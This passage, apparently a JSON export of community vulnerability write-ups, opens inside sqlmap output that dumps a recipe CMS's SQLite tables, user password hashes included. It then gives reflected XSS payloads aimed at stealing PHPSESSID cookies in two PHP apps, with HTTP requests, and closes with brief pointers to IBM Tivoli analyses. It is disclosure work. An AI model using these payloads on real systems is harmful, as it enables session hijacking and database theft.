06:26:59 |\r\n| 3       | 2         | 6          | <blank> | Test User Comment 101             | 2021-09-28 07:32:49 |\r\n| 1       | 2         | 7          | <blank> | test                              | 2021-09-28 07:34:03 |\r\n+---------+-----------+------------+---------+-----------------------------------+---------------------+\r\n\r\n[15:54:53] [INFO] table 'SQLite_masterdb.comment_list' dumped to CSV file 'C:\\Users\\venvaropt\\AppData\\Local\\sqlmap\\output\\192.168.1.180\\dump\\SQLite_masterdb\\comment_list.csv'\r\n[15:54:53] [INFO] fetching columns for table 'recipe_list'\r\n[15:54:53] [INFO] fetching entries for table 'recipe_list'\r\n[15:54:53] [INFO] fetching number of entries for table 'recipe_list' in database 'SQLite_masterdb'\r\n[15:54:53] [INFO] resumed: 2\r\n[15:54:53] [INFO] retrieved:\r\n[15:54:53] [INFO] retrieved:\r\n[15:54:53] [INFO] resumed: 4\r\n[15:54:53] [INFO] resumed: 2021-09-28 03:14:26\r\n[15:54:53] [INFO] resumed: &lt;p&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut vestibulum, magna sed porttitor venenatis, metus ex ornare arcu, non tincidunt orci lectus at odio. Proin elementum convallis leo at lacinia. Donec in libero vitae nunc consequat vehicula ac et sem. Nulla ac lacus vitae augue porta congue at vitae ante. Suspendisse pulvinar eget nibh bibendum aliquam. Nulla rutrum sit amet mi et facilisis. Donec et odio augue. Cras elementum at sapien at suscipit. Nam sodales, velit nec congue mollis, ligula neque blandit eros, ac porta nibh lorem vel lacus.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;\r\n[15:54:53] [INFO] resumed: &lt;ul&gt;&lt;li&gt;sample&lt;/li&gt;&lt;li&gt;Test&lt;/li&gt;&lt;li&gt;ingredient 1&lt;/li&gt;&lt;li&gt;ingredient 2&lt;/li&gt;&lt;li&gt;ingredient 3&lt;/li&gt;&lt;li&gt;ingredient 4&lt;/li&gt;&lt;li&gt;ingredient 5&lt;/li&gt;&lt;li&gt;ingredient 6&lt;br&gt;&lt;/li&gt;&lt;/ul&gt;\r\n[15:54:53] [INFO] resumed: &lt;p&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Aliquam nec sodales arcu. Integer posuere, eros ut imperdiet lacinia, orci mi sodales augue, eget pretium dolor nisi varius lorem. In metus diam, venenatis nec metus et, posuere mollis mauris.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;&lt;b&gt;Nutrition Facts&lt;/b&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Sample 101 5%&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Sample 102 20%&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Sample 103 25%&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Sample 104 25%&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Sample 105 5%&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Sample 106 5%&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Sample 107 15%&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\r\n[15:54:53] [INFO] resumed: 1\r\n[15:54:53] [INFO] resumed: 1\r\n[15:54:53] [INFO] resumed: <ol><li><span style=\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"font-family: \\\\\\\\\\\\\"Open Sans\\\\\\\\\\\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\">Quisque ac euismod sem.</span></li><li><span style=\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"font-family: \\\\\\\\\\\\\"Open Sans\\\\\\\\\\\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\">Cras aliquet dolor id lacinia pretium. Curabitur vitae dictum urna, sed viverra nisl. Aenean non finibus lacus. Pellentesque at ex ut augue pulvinar vestibulum at eu nibh.</span></li><li><span style=\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"font-family: \\\\\\\\\\\\\"Open Sans\\\\\\\\\\\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\">Curabitur semper, elit sit amet consectetur suscipit, dui felis vulputate elit, eu lacinia tellus lorem in nunc. Pellentesque ac neque enim.</span></li><li><span style=\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"font-family: \\\\\\\\\\\\\"Open Sans\\\\\\\\\\\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\">Maecenas at bibendum mauris, eu cursus enim. Vestibulum a efficitur velit, sit amet tincidunt tellus. Nam hendrerit justo metus, ac eleifend mauris egestas vitae.</span></li><li><span style=\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"font-family: \\\\\\\\\\\\\"Open Sans\\\\\\\\\\\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\">Aliquam nec sodales arcu. Integer posuere, eros ut imperdiet lacinia, orci mi sodales augue, eget pretium dolor nisi varius lorem. In metus diam, venenatis nec metus et, posuere mollis mauris. Sed sodales nibh iaculis velit dignissim ultrices.<br></span><br></li></ol>\r\n[15:54:53] [INFO] resumed: Sample Menu\r\n[15:54:53] [INFO] resumed: 1\r\n[15:54:53] [INFO] retrieved:\r\n[15:54:53] [INFO] retrieved:\r\n[15:54:53] [INFO] resumed: 3\r\n[15:54:53] [INFO] resumed: 2021-09-28 07:24:03\r\n[15:54:53] [INFO] resumed: &lt;p&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Etiam hendrerit tellus in nisi semper vulputate. Curabitur accumsan metus sit amet erat volutpat, placerat laoreet lorem tempus. Aenean eget convallis nisi. Duis id nisl ut urna fermentum commodo. Cras quis nulla lacus. Etiam et nulla non risus hendrerit tincidunt. Vestibulum efficitur odio in nibh ultrices laoreet.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;\r\n[15:54:53] [INFO] resumed: &lt;ul&gt;&lt;li&gt;Test 1&lt;/li&gt;&lt;li&gt;Test 2&lt;/li&gt;&lt;li&gt;Test 3&lt;/li&gt;&lt;li&gt;Test 4&lt;/li&gt;&lt;li&gt;Test 5&lt;/li&gt;&lt;li&gt;Test 6&lt;br&gt;&lt;/li&gt;&lt;/ul&gt;\r\n[15:54:53] [INFO] resumed: &lt;p&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Integer ut quam congue, posuere ante vitae, vestibulum orci. Integer accumsan erat sed sagittis commodo. Nullam vulputate, libero quis venenatis vestibulum, ex enim pellentesque purus, quis gravida lectus tellus id justo. Integer elementum a lacus a vehicula. Sed sed purus a massa tincidunt mattis at non ligula.&amp;nbsp;&lt;/span&gt;&lt;br&gt;&lt;/p&gt;\r\n[15:54:53] [INFO] resumed: 2\r\n[15:54:53] [INFO] resumed: 1\r\n[15:54:53] [INFO] resumed: <ol><li><span style=\\\\\\\\\\\\\"font-family: \\\\\"Open Sans\\\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\\\\\\\">Maecenas aliquet nunc vitae risus condimentum accumsan. In blandit, sapien vitae tristique viverra, tortor est pretium quam, eget ultricies metus ipsum eget turpis.</span></li><li><span style=\\\\\\\\\\\\\"font-family: \\\\\"Open Sans\\\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\\\\\\\">Morbi vitae hendrerit elit. Nulla ullamcorper dapibus ipsum sit amet convallis. Vestibulum ullamcorper mollis risus a ullamcorper. </span></li><li><span style=\\\\\\\\\\\\\"font-family: \\\\\"Open Sans\\\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\\\\\\\">Sed consectetur mauris metus, sed interdum purus pretium gravida. Phasellus pulvinar fringilla fringilla. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></li><li><span style=\\\\\\\\\\\\\"font-family: \\\\\"Open Sans\\\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\\\\\\\">Quisque vel sem dapibus, congue felis sit amet, sollicitudin odio. Vestibulum rhoncus semper diam quis aliquam. <br></span><br></li></ol>\r\n[15:54:53] [INFO] resumed: Sample Recipe 102\r\n[15:54:53] [INFO] resumed: 3\r\nDatabase: <current>\r\nTable: recipe_list\r\n[2 entries]\r\nr\n| user_id | recipe_id | category_id | step| title             | status | FOREIGN | other_info| description| ingredients                                                                                                                                                                                                                                                                               | date_created        |\r\nr\n| 1       | 1         | 4           | <ol><li><span style=\\\\\\\\\\\\\\\"font-family: \\\\\\\"Open Sans\\\\\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\\\\\\\\\">Quisque ac euismod sem.</span></li><li><span style=\\\\\\\\\\\\\\\"font-family: \\\\\\\"Open Sans\\\\\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\\\\\\\\\">Cras aliquet dolor id lacinia pretium. Curabitur vitae dictum urna, sed viverra nisl. Aenean non finibus lacus. Pellentesque at ex ut augue pulvinar vestibulum at eu nibh.</span></li><li><span style=\\\\\\\\\\\\\\\"font-family: \\\\\\\"Open Sans\\\\\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\\\\\\\\\">Curabitur semper, elit sit amet consectetur suscipit, dui felis vulputate elit, eu lacinia tellus lorem in nunc. Pellentesque ac neque enim.</span></li><li><span style=\\\\\\\\\\\\\\\"font-family: \\\\\\\"Open Sans\\\\\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\\\\\\\\\">Maecenas at bibendum mauris, eu cursus enim. Vestibulum a efficitur velit, sit amet tincidunt tellus. Nam hendrerit justo metus, ac eleifend mauris egestas vitae.</span></li><li><span style=\\\\\\\\\\\\\\\"font-family: \\\\\\\"Open Sans\\\\\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\\\\\\\\\">Aliquam nec sodales arcu. Integer posuere, eros ut imperdiet lacinia, orci mi sodales augue, eget pretium dolor nisi varius lorem. In metus diam, venenatis nec metus et, posuere mollis mauris. Sed sodales nibh iaculis velit dignissim ultrices.<br></span><br></li></ol> | Sample Menu       | 1      | <blank> | &lt;p&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Aliquam nec sodales arcu. Integer posuere, eros ut imperdiet lacinia, orci mi sodales augue, eget pretium dolor nisi varius lorem. In metus diam, venenatis nec metus et, posuere mollis mauris.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;&lt;b&gt;Nutrition Facts&lt;/b&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Sample 101 5%&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Sample 102 20%&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Sample 103 25%&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Sample 104 25%&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Sample 105 5%&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Sample 106 5%&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Sample 107 15%&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; | &lt;p&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut vestibulum, magna sed porttitor venenatis, metus ex ornare arcu, non tincidunt orci lectus at odio. Proin elementum convallis leo at lacinia. Donec in libero vitae nunc consequat vehicula ac et sem. Nulla ac lacus vitae augue porta congue at vitae ante. Suspendisse pulvinar eget nibh bibendum aliquam. Nulla rutrum sit amet mi et facilisis. Donec et odio augue. Cras elementum at sapien at suscipit. Nam sodales, velit nec congue mollis, ligula neque blandit eros, ac porta nibh lorem vel lacus.&lt;/span&gt;&lt;br&gt;&lt;/p&gt; | &lt;ul&gt;&lt;li&gt;sample&lt;/li&gt;&lt;li&gt;Test&lt;/li&gt;&lt;li&gt;ingredient 1&lt;/li&gt;&lt;li&gt;ingredient 2&lt;/li&gt;&lt;li&gt;ingredient 3&lt;/li&gt;&lt;li&gt;ingredient 4&lt;/li&gt;&lt;li&gt;ingredient 5&lt;/li&gt;&lt;li&gt;ingredient 6&lt;br&gt;&lt;/li&gt;&lt;/ul&gt; | 2021-09-28 03:14:26 |\r\n| 3       | 2         | 3           | <ol><li><span style=\\\\\\\"font-family: \\\"Open Sans\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\">Maecenas aliquet nunc vitae risus condimentum accumsan. In blandit, sapien vitae tristique viverra, tortor est pretium quam, eget ultricies metus ipsum eget turpis.</span></li><li><span style=\\\\\\\"font-family: \\\"Open Sans\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\">Morbi vitae hendrerit elit. Nulla ullamcorper dapibus ipsum sit amet convallis. Vestibulum ullamcorper mollis risus a ullamcorper. </span></li><li><span style=\\\\\\\"font-family: \\\"Open Sans\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\">Sed consectetur mauris metus, sed interdum purus pretium gravida. Phasellus pulvinar fringilla fringilla. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></li><li><span style=\\\\\\\"font-family: \\\"Open Sans\\\", Arial, sans-serif; font-size: 14px; text-align: justify;\\\\\\\">Quisque vel sem dapibus, congue felis sit amet, sollicitudin odio. Vestibulum rhoncus semper diam quis aliquam. <br></span><br></li></ol>                                                                                                                                                                                                                                                                                                                                                                | Sample Recipe 102 | 1      | <blank> | &lt;p&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Integer ut quam congue, posuere ante vitae, vestibulum orci. Integer accumsan erat sed sagittis commodo. Nullam vulputate, libero quis venenatis vestibulum, ex enim pellentesque purus, quis gravida lectus tellus id justo. Integer elementum a lacus a vehicula. Sed sed purus a massa tincidunt mattis at non ligula.&amp;nbsp;&lt;/span&gt;&lt;br&gt;&lt;/p&gt| &lt;p&gt;&lt;span style=&quot;font-family: &amp;quot;Open Sans&amp;quot;, Arial, sans-serif; font-size: 14px; text-align: justify;&quot;&gt;Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Etiam hendrerit tellus in nisi semper vulputate. Curabitur accumsan metus sit amet erat volutpat, placerat laoreet lorem tempus. Aenean eget convallis nisi. Duis id nisl ut urna fermentum commodo. Cras quis nulla lacus. Etiam et nulla non risus hendrerit tincidunt. Vestibulum efficitur odio in nibh ultrices laoreet.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;                                                                                                                                                    | &lt;ul&gt;&lt;li&gt;Test 1&lt;/li&gt;&lt;li&gt;Test 2&lt;/li&gt;&lt;li&gt;Test 3&lt;/li&gt;&lt;li&gt;Test 4&lt;/li&gt;&lt;li&gt;Test 5&lt;/li&gt;&lt;li&gt;Test 6&lt;br&gt;&lt;/li&gt;&lt;/ul&gt;                                                                                         | 2021-09-28 07:24:03 |\r\nr\n\r\n[15:54:53] [INFO] table 'SQLite_masterdb.recipe_list' dumped to CSV file 'C:\\Users\\venvaropt\\AppData\\Local\\sqlmap\\output\\192.168.1.180\\dump\\SQLite_masterdb\\recipe_list.csv'\r\n[15:54:53] [INFO] fetching columns for table 'user_list'\r\n[15:54:53] [INFO] fetching entries for table 'user_list'\r\n[15:54:53] [INFO] recognized possible password hashes in column 'password'\r\ndo you want to crack them via a dictionary-based attack? [Y/n/q] N\r\nDatabase: <current>\r\nTable: user_list\r\n[3 entries]\r\n+---------+--------+-------------------+----------------------------------+----------+---------------------+\r\n| user_id | status | fullname          | password                         | username | date_created        |\r\n+---------+--------+-------------------+----------------------------------+----------+---------------------+\r\n| 1       | 1      | Try My Recipe Mgt | 48280ea386fb6ce4e66d199fcf14b333 | mgt      | 2021-09-28 02:42:29 |\r\n| 3       | 1      | Claire Blake      | 4744ddea876b11dcb1d169fadf494418 | cblake   | 2021-09-28 07:02:50 |\r\n| 4       | 1      | John Smith        | 39ce7e2a8573b41ce73b5ba41617f8f7 | jsmith   | 2021-09-28 07:59:40 |\r\n+---------+--------+-------------------+----------------------------------+----------+---------------------+\r\n\r\n[15:54:53] [INFO] table 'SQLite_masterdb.user_list' dumped to CSV file 'C:\\Users\\venvaropt\\AppData\\Local\\sqlmap\\output\\192.168.1.180\\dump\\SQLite_masterdb\\user_list.csv'\r\n[15:54:53] [INFO] fetching columns for table 'category_list'\r\n[15:54:53] [INFO] fetching entries for table 'category_list'\r\nDatabase: <current>\r\nTable: category_list\r\n[4 entries]\r\nr\n| category_id | name    | description|\r\nr\n| 1           | Vegies  | Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut vestibulum, magna sed porttitor venenatis, metus ex ornare arcu, non tincidunt orci lectus at odio. Proin elementum convallis leo at lacinia. Donec in libero vitae nunc consequat vehicula ac et sem. Nulla ac lacus vitae augue porta congue at vitae ante. Suspendisse pulvinar eget nibh bibendum aliquam. Nulla rutrum sit amet mi et facilisis. Donec et odio augue. Cras elementum at sapien at suscipit. Nam sodales, velit nec congue mollis, ligula neque blandit eros, ac porta nibh lorem vel lacus. |\r\n| 2           | Porks   | Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut vestibulum, magna sed porttitor venenatis, metus ex ornare arcu, non tincidunt orci lectus at odio. Proin elementum convallis leo at lacinia. Donec in libero vitae nunc consequat vehicula ac et sem. Nulla ac lacus vitae augue porta congue at vitae ante. Suspendisse pulvinar eget nibh bibendum aliquam. Nulla rutrum sit amet mi et facilisis. Donec et odio augue. Cras elementum at sapien at suscipit. Nam sodales, velit nec congue mollis, ligula neque blandit eros, ac porta nibh lorem vel lacus. |\r\n| 3           | Beef    | In vehicula risus iaculis, placerat dolor a, accumsan elit. Phasellus vel sem in tellus maximus rutrum commodo non libero. Sed tincidunt libero elit, in commodo libero pulvinar lacinia.                                                                                                                                                                                                                                                                                                                                                                                    |\r\n| 4           | Chicken | In vehicula risus iaculis, placerat dolor a, accumsan elit. Phasellus vel sem in tellus maximus rutrum commodo non libero. Sed tincidunt libero elit, in commodo libero pulvinar lacinia.                                                                                                                                                                                                                                                                                                                                                                                    |\r\nr\n\r\n[15:54:53] [INFO] table 'SQLite_masterdb.category_list' dumped to CSV file 'C:\\Users\\venvaropt\\AppData\\Local\\sqlmap\\output\\192.168.1.180\\dump\\SQLite_masterdb\\category_list.csv'\r\n[15:54:53] [INFO] fetching columns for table 'sqlite_sequence'\r\n[15:54:53] [INFO] fetching entries for table 'sqlite_sequence'\r\nDatabase: <current>\r\nTable: sqlite_sequence\r\n[5 entries]\r\n+-----+---------------+\r\n| seq | name          |\r\n+-----+---------------+\r\n| 2   | admin_list    |\r\n| 5   | category_list |\r\n| 4   | user_list     |\r\n| 3   | recipe_list   |\r\n| 7   | comment_list  |\r\n+-----+---------------+\r\n\r\n[15:54:53] [INFO] table 'SQLite_masterdb.sqlite_sequence' dumped to CSV file 'C:\\Users\\venvaropt\\AppData\\Local\\sqlmap\\output\\192.168.1.180\\dump\\SQLite_masterdb\\sqlite_sequence.csv'\r\n[15:54:53] [INFO] fetched data logged to text files under 'C:\\Users\\venvaropt\\AppData\\Local\\sqlmap\\output\\192.168.1.180'\r\n\r\n[*] ending @ 15:54:53 /2021-09-29/\r\n```\r\n\r\n----------------------------------------------------------------------------------------------------------------\r\n\r\n## XSS Vulnerability Description:\r\nThe value of the page request parameter on Recipe Sharing Website - CMS (by:oretnom23) is copied into the HTML document as text between TITLE tags. The payload n0gg2</title><script>alert(1)</script>pfcjm was submitted in the page parameter. This input was echoed unmodified in the application's response. The attacker can take control of some of the accounts by using the PHPSESSID Hijacking method attack. The vulnerable parameter is `fullname` from `login_registration` app.\r\n\r\n- XSS Request:\r\n\r\n```cmd\r\nGET /recipe_site/?page=view_recipen0gg2%3c%2ftitle%3e%3cscript%3ealert(1)%3c%2fscript%3epfcjm&rid=2 HTTP/1.1\r\nHost: 192.168.1.180\r\nCookie: PHPSESSID=pbvnfsmuchv0ri90bteh2bl3r6\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://192.168.1.180/recipe_site/?page=recipe&cid=3\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\n```\r\n\r\n- XSS Response:\r\n\r\n```cmd\r\nHTTP/1.1 200 OK\r\nDate: Wed, 29 Sep 2021 07:50:33 GMT\r\nServer: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.22\r\nX-Powered-By: PHP/7.4.22\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nContent-Length: 7630\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<br />\r\n<b>Warning</b>: SQLite3::exec(): database is locked in <b>C:\\xampp\\htdocs\\recipe_site\\DBConnection.php</b> on line <b>76</b><br />\r\n<br />\r\n<b>Warning</b>: SQLite3::exec(): database is locked i\r\n...[SNIP]...\r\n<title>View Recipen0gg2</title><script>alert(1)</script>pfcjm | Try My Recipe</title>\r\n...[SNIP]...\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/edit/main/vendors/oretnom23/CVE-nu11-17-092921)\r\n\r\n\r\n## Proof MySQL Injection:\r\n[href](https://streamable.com/t4zlq5)\r\n\r\n\r\n## Proof XSS-Stored Hijacking PHPSESSID:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-17-092921/XSS/CVE-nu11-17-092821-XSS-STORED.gif)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ebb32ee6-ab11-4500-a49f-34e12b5c291f",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "43452008-e347-4ef1-a88a-e1c171e57fbf",
      "created": "2021-09-30T10:41:07.970871Z",
      "revisionDate": "2021-10-02T04:39:35.577606Z",
      "document": "## [CVE-nu11-19-302021](https://www.sourcecodester.com/php/14967/electric-billing-management-system-php-and-sqlite-free-source-code.html)\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-19-302021/docs/public_home_page.png)\r\n\r\n-------------------------------------------------------------------------------------------------------------\r\n\r\n## Description:\r\nThe Electric Billing Management System (by oretnom23) is suffering from XSS - DOM PHPSESSID hijacking vulnerability. \r\nThe attacker can execute a remote payload and he can steal an active PHPSESSID, he can use for different malicious purpose.\r\n\r\n-------------------------------------------------------------------------------------------------------------\r\n\r\n- Payload...\r\n\r\n```js\r\nzd3ji%3c%2ftitle%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3eoyc33\r\n```\r\n- Vulnerable app `about`\r\n\r\n```URL\r\nhttp://192.168.1.180/electric_billing/?page=about\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/CVE-nu11-19-302021)\r\n\r\n## Proof:\r\n[href](https://streamable.com/ihpx6x)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "8bcbba25-07ce-4c90-b349-fd3954320b14",
      "editorId": "769a207c-ca81-467c-8bcb-673ea74bfb6b",
      "topicId": "2e370ce8-2c14-4752-bb8c-5d893c4ac4a8",
      "created": "2021-09-30T14:10:32.54663Z",
      "revisionDate": "2021-09-30T14:10:32.542202Z",
      "document": "A complete Root Cause Analysis could be found at https://voidsec.com/tivoli-madness",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "d188a55d-6c0b-4b64-84bc-ef358e48dcb7",
      "editorId": "769a207c-ca81-467c-8bcb-673ea74bfb6b",
      "topicId": "d03581e6-4e21-43bd-8665-740c3c12016a",
      "created": "2021-09-30T14:14:15.477769Z",
      "revisionDate": "2021-09-30T14:14:15.476738Z",
      "document": "IBM Tivoli Storage Manager \u2013 ITSM Administrator Client Command Line Administrative Interface (dsmadmc.exe) Version 5, Release 2, Level 0.1, is vulnerable to a stack-based buffer overflow in the \u2018id\u2019 parameter.\r\nA complete root cause analysis could be found at: https://voidsec.com/tivoli-madness/#IBM_Tivoli_Storage_Manager",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
